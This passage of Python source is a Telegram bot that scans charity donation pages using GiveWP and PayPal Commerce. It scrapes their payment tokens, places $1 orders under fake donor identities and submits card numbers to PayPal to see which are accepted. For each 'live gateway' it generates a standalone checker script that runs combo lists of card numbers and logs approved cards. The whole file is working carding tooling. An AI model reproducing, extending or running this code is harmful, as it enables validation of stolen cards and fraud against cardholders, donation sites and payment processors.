                self.tokens['client_token'] = enc
                break

        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
        for name, value in inputs:
            self.form_data[name] = value

    def run(self, card_number=TEST_CARD_NUMBER, exp_month=TEST_CARD_EXPIRY_MONTH, exp_year=TEST_CARD_EXPIRY_YEAR, cvc=TEST_CARD_CVC):
        if not HAS_SELENIUM:
            return "Selenium not installed"

        try:
            self.progress("🚀 Starting...")
            if not self.setup_driver():
                return "Driver Setup Failed"

            self.progress("🌐 Opening site...")
            try:
                self.driver.get(self.url)
                time.sleep(3)
            except Exception as e:
                self.close()
                return f"Page Load Error: {str(e)[:80]}"

            if self.detect_cloudflare():
                self.screenshot("cloudflare")
                self.progress("❌ Cloudflare")
                self.close()
                return "CLOUDFLARE_DETECTED"

            if self.detect_captcha():
                self.screenshot("captcha")
                self.progress("❌ Captcha")
                self.close()
                return "CAPTCHA_DETECTED"

            self.screenshot("1_opened")

            self.progress("🔍 Scanning...")
            if not self.quick_scan():
                self.screenshot("2_no_keywords")
                self.progress("❌ No donation keywords")
                self.close()
                return "NO_DONATION_FOUND"

            self.html = self.driver.page_source
            self.extract_tokens()

            self.progress("🎯 Finding button...")
            clicked = [False]
            done = [False]
            def find_btn():
                try:
                    clicked[0] = self.click_any_donate_button()
                except:
                    clicked[0] = False
                done[0] = True
            t = threading.Thread(target=find_btn, daemon=True)
            t.start()
            t.join(timeout=25)
            if not done[0]:
                self.progress("⚠️ Search timeout")
            else:
                self.screenshot("3_after_click")

            time.sleep(2)

            self.progress("📝 Filling form...")
            self.fill_any_form()
            self.screenshot("4_form_filled")

            self.progress("☑️ Terms...")
            self.accept_any_terms()

            self.progress("💰 Amount...")
            self.pick_amount()

            self.progress("💳 Credit Card...")
            self.select_credit_card()
            self.screenshot("5_payment_selected")
            time.sleep(2)

            self.progress("🖱️ Continue...")
            self.click_any_pay_button()
            time.sleep(3)
            self.screenshot("6_after_continue")

            self.progress("💳 Card details...")
            self.fill_credit_card_info(card_number, exp_month, exp_year, cvc)
            self.screenshot("7_card_filled")

            self.progress("🖱️ Final pay...")
            self.click_any_pay_button()

            self.progress("⏳ Waiting result...")
            result = self.wait_for_result(timeout=15)
            self.screenshot("8_result")

            self.progress(f"✅ Result: {result}")
            self.close()
            return result

        except Exception as e:
            try:
                self.screenshot("error")
            except:
                pass
            self.close()
            return f"Error: {str(e)[:100]}"


class RequestChecker:
    def __init__(self, url):
        self.url = url
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent() if HAS_FAKE_UA else SimpleUA()
        self.parsed = urlparse(url)
        self.host = self.parsed.netloc
        self.path = self.parsed.path
        if self.parsed.query:
            self.path += f"?{self.parsed.query}"
        self.client_id = None
        self.access_token = None
        self.client_token = None
        self.form_data = {}
        self.ajax_url = None
        self.html = ""
        self.cookies = {}
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"
        self.donation = "1.00"

    def init_and_extract(self):
        try:
            headers = {
                'user-agent': self.uu.random,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9'
            }
            response = self.r.get(f'https://{self.host}{self.path}', headers=headers, timeout=15)
            self.html = response.text
            self.cookies = dict(response.cookies)
            self._extract_client_id()
            self._extract_form_data()
            self._extract_ajax_url()
            self._extract_tokens()
        except:
            pass

    def _extract_client_id(self):
        patterns = [
            r'client-id=["\']([^"\']+)["\']',
            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'data-client-id=["\']([^"\']+)["\']',
            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})["\']',
            r'"clientId"\s*:\s*"([^"]+)"'
        ]
        for pattern in patterns:
            match = re.search(pattern, self.html, re.IGNORECASE)
            if match:
                self.client_id = match.group(1)
                return

    def _extract_form_data(self):
        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', self.html)
        for name, value in inputs:
            self.form_data[name] = value

    def _extract_ajax_url(self):
        if 'admin-ajax.php' in self.html:
            self.ajax_url = f'https://{self.host}/wp-admin/admin-ajax.php'

    def _extract_tokens(self):
        patterns = [
            r'data-client-token=["\']([^"\']+)["\']',
            r'client-token=["\']([^"\']+)["\']',
            r'client_token=["\']([^"\']+)["\']'
        ]
        for pattern in patterns:
            match = re.search(pattern, self.html, re.IGNORECASE)
            if match:
                enc = match.group(1)
                try:
                    padded = enc + '=' * (-len(enc) % 4)
                    decoded = base64.b64decode(padded).decode('utf-8', errors='ignore')
                    token_match = re.search(r'"accessToken":"([^"]+)"', decoded)
                    if token_match:
                        self.access_token = token_match.group(1)
                        return
                except:
                    pass
                self.client_token = enc
                return

    def charge(self, card):
        try:
            if not self.ajax_url:
                return "NO_AJAX"

            order_id = self._create_order()
            if not order_id:
                return "DECLINED"

            parts = card.split("|")
            if len(parts) < 4:
                return "Invalid card format"

            n = parts[0].strip()
            mm = parts[1].strip()
            yy = parts[2].strip()
            cvc = parts[3].strip()

            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{yy}-{mm}"

            return self._confirm_payment(order_id, n, expiry, cvc)
        except Exception as e:
            return f"Error: {str(e)[:100]}"

    def _create_order(self):
        if not self.ajax_url:
            return None

        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce'
        })

        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.host}',
            'referer': f'https://{self.host}{self.path}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }

        for action in ['give_paypal_commerce_create_order', 'give_create_order']:
            try:
                response = self.r.post(self.ajax_url, params={'action': action}, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if 'data' in data and isinstance(data['data'], dict) and 'id' in data['data']:
                            return data['data']['id']
                        if 'id' in data:
                            return data['id']
                    except:
                        pass
            except:
                continue
        return None

    def _confirm_payment(self, order_id, n, expiry, cvc):
        tokens = []
        if self.client_token:
            tokens.append(self.client_token)
        if self.access_token:
            tokens.append(self.access_token)
        if self.client_id:
            tokens.append(self.client_id)

        for token in tokens:
            headers = {
                'authorization': f'Bearer {token}',
                'paypal-client-metadata-id': self.client_id or '',
                'user-agent': self.uu.random,
                'paypal-request-id': str(uuid.uuid4())
            }
            data = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': expiry,
                        'security_code': cvc,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                    }
                },
                'application_context': {'vault': False}
            }
            try:
                response = self.r.post(
                    f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                    headers=headers,
                    json=data,
                    timeout=15
                )
                if response.status_code == 200:
                    result = response.json()
                    result_str = str(result).upper()

                    if 'INSUFFICIENT_FUNDS' in result_str:
                        return "INSUFFICIENT_FUNDS"
                    if 'EXPIRED_CARD' in result_str:
                        return "EXPIRED_CARD"
                    if 'ORDER_NOT_APPROVED' in result_str:
                        return "Payer cannot pay for this transaction."
                    if 'RESTRICTED_OR_INACTIVE_ACCOUNT' in result_str:
                        return "RESTRICTED_OR_INACTIVE_ACCOUNT"

                    if 'details' in result:
                        for detail in result['details']:
                            issue = detail.get('issue', '')
                            if issue:
                                return issue
            except:
                continue

        return "DECLINED"


def check_with_selenium(link, chat_id=None, message_id=None):
    progress_updates = []
    screenshots = []

    def progress_callback(msg):
        progress_updates.append(msg)
        if chat_id and message_id:
            try:
                text = f"🔍 <b>Scanning...</b>\n\n📝 {msg}\n\n🔗 <code>{link}</code>"
                safe_edit_message(chat_id, message_id, text)
            except:
                pass

    def screenshot_callback(filepath, name):
        screenshots.append((filepath, name))
        if chat_id:
            try:
                safe_send_photo(chat_id, filepath, caption=f"📸 {name}")
                try:
                    os.remove(filepath)
                except:
                    pass
            except:
                pass

    try:
        bot_obj = HumanLikeSelenium(
            url=link,
            headless=True,
            progress_callback=progress_callback,
            screenshot_callback=screenshot_callback
        )

        result = bot_obj.run()

        is_live = False
        for live in LIVE_RESPONSES:
            if live.lower() in result.lower():
                is_live = True
                break

        return {
            'link': link,
            'live': is_live,
            'respons': result,
            'tokens': bot_obj.tokens,
            'form_data': bot_obj.form_data,
            'method': 'selenium',
            'progress': progress_updates,
            'screenshots': len(screenshots)
        }
    except Exception as e:
        return {
            'link': link,
            'live': False,
            'respons': f'Error: {str(e)[:100]}',
            'method': 'selenium'
        }


def check_with_requests(link):
    try:
        checker = RequestChecker(link)
        checker.init_and_extract()

        html_lower = checker.html.lower()
        has_donation = False

        for kw in DONATE_KEYWORDS + PAYMENT_KEYWORDS:
            if kw.lower() in html_lower:
                has_donation = True
                break

        if not has_donation:
            return {
                'link': link,
                'live': False,
                'respons': 'NO_DONATION_FOUND',
                'method': 'requests'
            }

        result = checker.charge(TEST_CARD)

        is_live = False
        for live in LIVE_RESPONSES:
            if live.lower() in result.lower():
                is_live = True
                break

        return {
            'link': link,
            'live': is_live,
            'respons': result,
            'client_id': checker.client_id or '',
            'access_token': checker.access_token or '',
            'client_token': checker.client_token or '',
            'form_data': checker.form_data,
            'ajax_url': checker.ajax_url or '',
            'cookies': checker.cookies,
            'url': checker.host,
            'inurl': checker.path,
            'method': 'requests'
        }
    except Exception as e:
        return {
            'link': link,
            'live': False,
            'respons': f'Error: {str(e)[:100]}',
            'method': 'requests'
        }


def generate_gateway_code(result):
    client_id = result.get('client_id', '')
    access_token = result.get('access_token', '')
    client_token = result.get('client_token', '')
    form_data = result.get('form_data', {})
    ajax_url = result.get('ajax_url', '')
    cookies = result.get('cookies', {})
    url = result.get('url', '')
    inurl = result.get('inurl', '')

    template = '''import requests, re, random, time, base64, uuid
from fake_useragent import UserAgent

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.donation = "1.00"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self.client_id = "CLIENT_ID_HERE"
        self.access_token = "ACCESS_TOKEN_HERE"
        self.client_token = "CLIENT_TOKEN_HERE"
        self.form_data = FORM_DATA_HERE
        self.ajax_url = "AJAX_URL_HERE"
        self.cookies = COOKIES_HERE
        self.url = "URL_HERE"
        self.inurl = "INURL_HERE"
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"

    def Charge(self, ccx):
        try:
            parts = ccx.strip().split("|")
            if len(parts) < 4:
                return "Invalid card format"
            n = parts[0].strip()
            mm = parts[1].strip()
            yy = parts[2].strip()
            cvc = parts[3].strip()
            if "20" in yy:
                yy = yy.split("20")[1]
            expiry = f"20{yy}-{mm}"

            order_id = self._create_order()
            if not order_id:
                return "DECLINED"

            tokens = []
            if self.client_token:
                tokens.append(self.client_token)
            if self.access_token:
                tokens.append(self.access_token)
            if self.client_id:
                tokens.append(self.client_id)

            for token in tokens:
                he4 = {
                    'authorization': f'Bearer {token}',
                    'paypal-client-metadata-id': self.client_id or '',
                    'user-agent': self.uu.random,
                    'paypal-request-id': str(uuid.uuid4())
                }
                da3 = {
                    'payment_source': {
                        'card': {
                            'number': n,
                            'expiry': expiry,
                            'security_code': cvc,
                            'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}
                        }
                    },
                    'application_context': {'vault': False}
                }
                try:
                    res = self.r.post(
                        f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                        headers=he4, json=da3, timeout=15
                    )
                    if res.status_code == 200:
                        result_str = str(res.json()).upper()
                        if 'INSUFFICIENT_FUNDS' in result_str:
                            return "INSUFFICIENT_FUNDS"
                        if 'EXPIRED_CARD' in result_str:
                            return "EXPIRED_CARD"
                        if 'ORDER_NOT_APPROVED' in result_str:
                            return "Payer cannot pay for this transaction."
                        break
                except:
                    continue

            return "DECLINED"
        except Exception as e:
            return f"Error: {e}"

    def _create_order(self):
        if not self.ajax_url:
            return None
        form_data = self.form_data.copy()
        form_data.update({
            'give-amount': self.donation,
            'payment-mode': 'paypal-commerce',
            'give_first': random.choice(self.first_name),
            'give_last': random.choice(self.last_name),
            'give_email': self.email,
            'give-gateway': 'paypal-commerce'
        })
        headers = {
            'user-agent': self.uu.random,
            'accept': 'application/json',
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.url}',
            'referer': f'https://{self.url}{self.inurl}',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        for action in ['give_paypal_commerce_create_order', 'give_create_order']:
            try:
                response = self.r.post(self.ajax_url, params={'action': action}, headers=headers, data=form_data, cookies=self.cookies, timeout=15)
                if response.status_code == 200:
                    data = response.json()
                    if 'data' in data and isinstance(data['data'], dict) and 'id' in data['data']:
                        return data['data']['id']
                    if 'id' in data:
                        return data['id']
            except:
                continue
        return None

if __name__ == '__main__':
    Getat = 'PayPal 1$'
    print(f'Cheker {Getat}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {resulti} > {Getat}')
            print('Response: ' + resulti)
            time.sleep(5)
    else:
        noy = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    resulti = rr.Charge(P)
                except Exception as e:
                    resulti = f'Error {e}'
                if 'CHARGE' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                    with open('Approved Card.txt', "a") as f:
                        f.write(P + ': ' + resulti + ' > ' + Getat)
                print(f'[{noy}] ' + P + '  >>  ' + resulti)
                time.sleep(13)
'''

    code = template.replace('CLIENT_ID_HERE', client_id)
    code = code.replace('ACCESS_TOKEN_HERE', access_token)
    code = code.replace('CLIENT_TOKEN_HERE', client_token)
    code = code.replace('FORM_DATA_HERE', str(form_data))
    code = code.replace('AJAX_URL_HERE', ajax_url)
    code = code.replace('COOKIES_HERE', str(cookies))
    code = code.replace('URL_HERE', url)
    code = code.replace('INURL_HERE', inurl)

    return code


@bot.message_handler(commands=["start"])
def start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, '🚫 You are blocked.')
        return

    user_id = message.from_user.id
    userr = message.from_user.first_name
    username = message.from_user.username or "No Username"

    IU = f'''🚀 <b>Welcome To Donation Bot</b> 🌟
━━━━━━━━━━━━━━━━━━━━
👤 <b>Name:</b> {userr}
📛 <b>Username:</b> @{username}
🆔 <b>ID:</b> <code>{user_id}</code>
━━━━━━━━━━━━━━━━━━━━
💎 <b>PayPal Gateway</b> → /paypal
💰 <b>Mass Extract</b> → /mass
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30'''

    safe_send_message(message.chat.id, IU)


@bot.message_handler(commands=['paypal'])
def check_paypal(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, '🚫 You are blocked.')
        return

    ko = safe_send_message(message.chat.id, "🔍 <b>Starting scan...</b>")
    if not ko:
        return

    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(message.chat.id, ko.message_id, '📝 <b>Usage:</b>\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>')
            return

        link = parts[1].strip()
        if not link.startswith(("http://", "https://")):
            safe_edit_message(message.chat.id, ko.message_id, "❌ <b>Invalid link format</b>")
            return

        result = check_with_selenium(link, chat_id=message.chat.id, message_id=ko.message_id)

        if result['live']:
            file_name = f'gateway_{int(time.time())}.py'
            try:
                code = generate_gateway_code(result)
                with open(file_name, "w", encoding="utf-8") as f:
                    f.write(code)

                caption = f'''💎 <b>Live Gateway Found!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link:</b> <code>{link}</code>
💬 <b>Response:</b> <code>{result['respons']}</code>
🛠️ <b>Method:</b> <code>{result.get('method', 'selenium')}</code>
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30'''

                safe_send_document(message.chat.id, file_name, caption=caption)
                try:
                    os.remove(file_name)
                except:
                    pass
            except Exception as e:
                safe_send_message(message.chat.id, f"⚠️ Code gen error: {str(e)[:80]}")
        else:
            safe_edit_message(
                message.chat.id,
                ko.message_id,
                f'''❌ <b>Dead Gateway</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link:</b> <code>{link}</code>
📝 <b>Response:</b> <code>{result['respons']}</code>
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30'''
            )

    except Exception as e:
        try:
            safe_edit_message(message.chat.id, ko.message_id, f"❌ <b>Error:</b> {str(e)[:100]}")
        except:
            pass


@bot.message_handler(commands=['mass'])
def mass_start(message):
    with open("blockusers.txt", "r") as file:
        blocked = file.read().splitlines()
    if str(message.from_user.id) in blocked:
        safe_send_message(message.chat.id, '🚫 You are blocked.')
        return

    msg = safe_send_message(message.chat.id, "📁 <b>Send a .txt file with links (one per line):</b>")
    if msg:
        bot.register_next_step_handler(msg, process_mass_file)


@bot.message_handler(commands=['stop'])
def stop_mass(message):
    user_id = message.from_user.id
    if user_id in processing_status:
        processing_status[user_id]['stop_flag'] = True
        safe_send_message(message.chat.id, "🛑 <b>Stopping...</b>")
    else:
        safe_send_message(message.chat.id, "❌ <b>No active process.</b>")


def process_mass_file(message):
    if not message.document:
        safe_send_message(message.chat.id, "❌ <b>Please send a .txt file.</b>")
        return

    try:
        file_info = safe_get_file(message.document.file_id)
        if not file_info:
            safe_send_message(message.chat.id, "❌ Failed to get file.")
            return

        downloaded_file = safe_download_file(file_info.file_path)
        if not downloaded_file:
            safe_send_message(message.chat.id, "❌ Failed to download file.")
            return

        links = downloaded_file.decode('utf-8', errors='ignore').splitlines()
        links = [link.strip() for link in links if link.strip()]

        if not links:
            safe_send_message(message.chat.id, "❌ <b>File is empty.</b>")
            return

        total = len(links)
        user_id = message.from_user.id
        chat_id = message.chat.id

        processing_status[user_id] = {
            'total': total,
            'processed': 0,
            'live': 0,
            'dead': 0,
            'lock': threading.Lock(),
            'current_url': '',
            'current_respons': '',
            'stop_flag': False,
            'done': False
        }

        status_msg = safe_send_message(chat_id, f"""📊 File #1 - Scanning links...
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0% ░░░░░░░░░░░░░░░░░░░░
Url : ...
Respons : ...
━━━━━━━━━━━━━━━━━━
⏱️ Checked 0 of {total}
🛑 /stop to stop""")

        if not status_msg:
            return

        def update_status():
            last_text = ""
            while True:
                time.sleep(10)
                try:
                    with processing_status[user_id]['lock']:
                        if processing_status[user_id].get('done', False):
                            break

                        processed = processing_status[user_id]['processed']
                        live = processing_status[user_id]['live']
                        dead = processing_status[user_id]['dead']
                        current_url = processing_status[user_id]['current_url']
                        current_respons = processing_status[user_id]['current_respons']

                        percent = int((processed / total) * 100) if total > 0 else 0
                        bar_length = 20
                        filled = int((percent / 100) * bar_length)
                        bar = '█' * filled + '░' * (bar_length - filled)

                        text = f"""📊 File #1 - Scanning links...
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {percent}% {bar}
Url : <code>{current_url[:60] if current_url else '...'}</code>
Respons : <code>{current_respons[:60] if current_respons else '...'}</code>
━━━━━━━━━━━━━━━━━━
⏱️ Checked {processed} of {total}
🛑 /stop to stop"""

                        if text != last_text:
                            try:
                                bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                                last_text = text
                            except:
                                pass
                except:
                    pass

        updater = threading.Thread(target=update_status, daemon=True)
        updater.start()

        time.sleep(1)

        for idx, link in enumerate(links):
            if processing_status[user_id].get('stop_flag', False):
                break

            with processing_status[user_id]['lock']:
                processing_status[user_id]['current_url'] = link
                processing_status[user_id]['current_respons'] = 'Checking...'

            result = check_with_selenium(link, chat_id=chat_id, message_id=status_msg.message_id)

            with processing_status[user_id]['lock']:
                processing_status[user_id]['processed'] += 1

                if result and result.get('live'):
                    processing_status[user_id]['live'] += 1
                    live_idx = processing_status[user_id]['live']
                    processing_status[user_id]['current_respons'] = result['respons']

                    try:
                        code = generate_gateway_code(result)
                        file_name = f'gateway_{live_idx}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)

                        caption = f"""💎 <b>Live Gateway #{live_idx}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 <b>Link:</b> <code>{result['link']}</code>
💬 <b>Respons:</b> <code>{result['respons']}</code>
━━━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30"""

                        safe_send_document(chat_id, file_name, caption=caption)
                        try:
                            os.remove(file_name)
                        except:
                            pass
                        time.sleep(1)
                    except Exception as e:
                        print(f"Send error: {e}")
                else:
                    processing_status[user_id]['dead'] += 1
                    processing_status[user_id]['current_respons'] = result.get('respons', 'Dead') if result else 'Dead'

            if idx % 50 == 0 and idx > 0:
                gc.collect()

            time.sleep(0.5)

        with processing_status[user_id]['lock']:
            processing_status[user_id]['done'] = True
            processed = processing_status[user_id]['processed']
            live = processing_status[user_id]['live']
            dead = processing_status[user_id]['dead']

        updater.join(timeout=3)

        final_text = f"""📊 <b>✅ Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 <b>Total Links:</b> {total}
✅ <b>Live (Sent):</b> {live}
❌ <b>Dead:</b> {dead}
💯 <b>Success Rate:</b> {int((live/total)*100) if total > 0 else 0}%
━━━━━━━━━━━━━━━━━━
⚡ <b>Dev:</b> @FAWZY30"""

        try:
            safe_edit_message(chat_id, status_msg.message_id, final_text)
        except:
            safe_send_message(chat_id, final_text)

        if user_id in processing_status:
            del processing_status[user_id]

    except Exception as e:
        safe_send_message(message.chat.id, f"❌ <b>Error:</b> {str(e)[:100]}")
        if 'user_id' in locals() and user_id in processing_status:
            del processing_status[user_id]


@bot.message_handler(commands=['block2'])
def block_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "⛔ No permission.")
        return
    try:
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        safe_send_message(message.chat.id, f"✅ {user_id_to_block} blocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /block2 [user_id]")


@bot.message_handler(commands=['unblock2'])
def unblock_user(message):
    if str(message.from_user.id) not in admins:
        safe_send_message(message.chat.id, "⛔ No permission.")
        return
    try:
        user_id_to_unblock = message.text.split()[1]
        with open('blockusers.txt', 'r') as file:
            lines = file.readlines()
        with open('blockusers.txt', 'w') as file:
            for line in lines:
                if line.strip() != user_id_to_unblock:
                    file.write(line)
        safe_send_message(message.chat.id, f"✅ {user_id_to_unblock} unblocked.")
    except:
        safe_send_message(message.chat.id, "Usage: /unblock2 [user_id]")


print('🚀 Bot is running...')

if __name__ == '__main__':
    try:
        bot.delete_webhook(drop_pending_updates=True)
        print("✅ Webhook deleted")
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Webhook error: {e}")

    while True:
        try:
            print("🔄 Starting bot polling...")
            bot.infinity_polling(timeout=30, long_polling_timeout=30)
        except KeyboardInterrupt:
            print('🛑 Bot stopped')
            break
        except Exception as e:
            error_str = str(e)
            if "409" in error_str:
                print("⚠️ 409 Conflict - Waiting 30s...")
                time.sleep(30)
            elif "502" in error_str or "Bad Gateway" in error_str:
                print("⚠️ 502 - Waiting 10s...")
                time.sleep(10)
            elif "429" in error_str:
                print("⚠️ 429 - Waiting 30s...")
                time.sleep(30)
            elif "timeout" in error_str.lower():
                print("⚠️ Timeout - Waiting 5s...")
                time.sleep(5)
            elif "Connection" in error_str:
                print("⚠️ Connection - Waiting 5s...")
                time.sleep(5)
            elif "500" in error_str:
                print("⚠️ 500 - Waiting 10s...")
                time.sleep(10)
            else:
                print(f"⚠️ Error: {error_str[:100]}")
                time.sleep(5)
